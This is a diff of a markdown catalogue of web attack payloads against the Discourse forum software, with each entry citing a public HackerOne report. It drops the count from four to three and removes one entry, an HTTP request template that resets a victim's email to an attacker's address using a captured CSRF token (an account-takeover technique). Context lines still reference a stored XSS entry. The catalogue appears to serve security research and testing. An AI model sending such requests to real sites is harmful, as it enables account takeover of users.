@@ -1,6 +1,6 @@
 # Discourse
 
-4 payloads.
+3 payloads.
 
 ### `a787b5b0`
 
@@ -16,16 +16,6 @@
 
 **Parameter:** `description`
 — [Stored XSS in posts because of absence of oembed variables values escaping](https://hackerone.com/reports/197914) · Discourse · [skavans](https://hackerone.com/skavans)
-
-### `b9f2c18b`
-
-```
-POST /users/$username/preferences/email.json HTTP/1.1
- 
-_method=PUT&email=$attacker_email&authenticity_token=$csrf_token
-```
-
-— [CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)](https://hackerone.com/reports/260697) · Discourse · [fransrosen](https://hackerone.com/fransrosen)
 
 ### `07c785a9`
 
